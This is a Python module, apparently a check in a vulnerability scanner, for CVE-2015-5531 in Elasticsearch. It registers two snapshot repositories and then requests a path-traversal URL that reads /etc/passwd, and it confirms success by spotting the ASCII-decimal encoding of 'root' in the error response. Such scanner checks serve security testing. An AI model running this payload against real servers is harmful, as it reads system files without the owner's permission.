#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool.md5 import random_md5

random_name_1 = random_md5()
random_name_2 = random_md5()

cve_2015_5531_payloads = [
    {
        'path-1': '_snapshot/{NAME}'.format(NAME=random_name_1),
        'data-1': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/NAME1"}}'.replace('NAME1', random_name_1),
        
        'path-2': '_snapshot/{NAME2}'.format(NAME2=random_name_2),
        'data-2': '{"type": "fs","settings": {"location": "/usr/share/elasticsearch/repo/NAME1/snapshot-backdata"}}'.replace('NAME1', random_name_1),
        
        'path-3': '_snapshot/{NAME}/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd'.format(NAME=random_name_1),
    },
]

def cve_2015_5531_scan(clients):
    ''' elasticsearch 1.5.1及以前, 无需任何配置即可触发该漏洞; 
        之后的新版, 配置文件elasticsearch.yml中必须存在path.repo, 该配置值为一个目录, 且该目录必须可写, 
        等于限制了备份仓库的根位置, 不配置该值, 默认不启动这个功能
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'ElasticSearch',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2015-5531',
    }

    for payload in cve_2015_5531_payloads:
        path_1 = payload['path-1']
        path_2 = payload['path-2']
        path_3 = payload['path-3']
        
        data_1 = payload['data-1']
        data_2 = payload['data-2']
        
        res1 = client.request(
            'put',
            path_1,
            data=data_1,
            allow_redirects=False,
            vul_info=vul_info
        )
        
        res2 = client.request(
            'put',
            path_2,
            data=data_2,
            allow_redirects=False,
            vul_info=vul_info
        )

        res3 = client.request(
            'get',
            path_3,
            allow_redirects=False,
            vul_info=vul_info
        )

        if (('114, 111, 111, 116' in res3.text)
            and ('Failed to derive' in res3.text)
        ):
            results = {
                'Target': res3.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Info': {
                    'Decode': 'ASCII decimal encode',
                    'Decode-Url': 'https://www.qqxiuzi.cn/bianma/ascii.htm'
                },
                'Request': res3
            }
            return results
    return None
